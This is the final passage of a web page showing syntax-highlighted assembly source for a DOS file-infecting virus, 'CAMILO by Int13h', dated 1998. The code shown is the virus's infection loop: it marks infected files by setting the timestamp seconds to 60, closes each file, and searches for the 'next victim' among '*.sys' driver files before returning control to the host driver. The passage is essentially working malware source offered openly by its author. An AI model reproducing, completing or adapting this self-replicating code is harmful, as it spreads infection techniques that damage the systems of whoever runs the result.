        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">05701h</span><span class="sc0">           </span><span class="sc1">; Restore date &amp; time</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bah</span><span class="sc0">
        </span><span class="sc5">Fecha</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b9h</span><span class="sc0">
        </span><span class="sc5">Hora</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">11100000b</span><span class="sc0">        </span><span class="sc1">; Mark time as infected</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">00011110b</span><span class="sc0">         </span><span class="sc1">; Set seconds=30*2=60!</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc0">

</span><span class="sc5">Close</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03eh</span><span class="sc0">             </span><span class="sc1">; Close the sucker</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">04fh</span><span class="sc0">             </span><span class="sc1">; Call the next victim</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">Verify</span><span class="sc0">

</span><span class="sc5">PopThem</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">01ah</span><span class="sc0">             </span><span class="sc1">; Restore original DTA</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OriginalDTA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                     </span><span class="sc1">; Jump to the original strategy routine!</span><span class="sc0">

        </span><span class="sc5">Buffer</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; We will read the header here</span><span class="sc0">

        </span><span class="sc1">; Dedicated to Camilo Jos‚ Cela, a genial novelist from Spain</span><span class="sc0">
        </span><span class="sc5">VirusName</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' [CAMILO by Int13h] '</span><span class="sc0">

        </span><span class="sc5">Victims</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.sys'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; Files to infect</span><span class="sc0">

        </span><span class="sc5">HEAP</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">         </span><span class="sc1">; End of virus in the file</span><span class="sc0">
        </span><span class="sc5">OriginalDTA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Old DTA address</span><span class="sc0">
        </span><span class="sc5">ViralDTA</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">43</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">; To use it in Find first/next functions</span><span class="sc0">

</span><span class="sc9">End</span><span class="sc0"> </span><span class="sc5">Camilo</span><span class="sc0">
</span><span class="sc2">8</span><span class="sc4">&lt;</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc2">8</span><span class="sc0">

                                                                     </span><span class="sc5">INT13H</span><span class="sc0">
                                                </span><span class="sc5">Paraguay</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">February</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1998</span><span class="sc0">
</span></div></body>
</html>
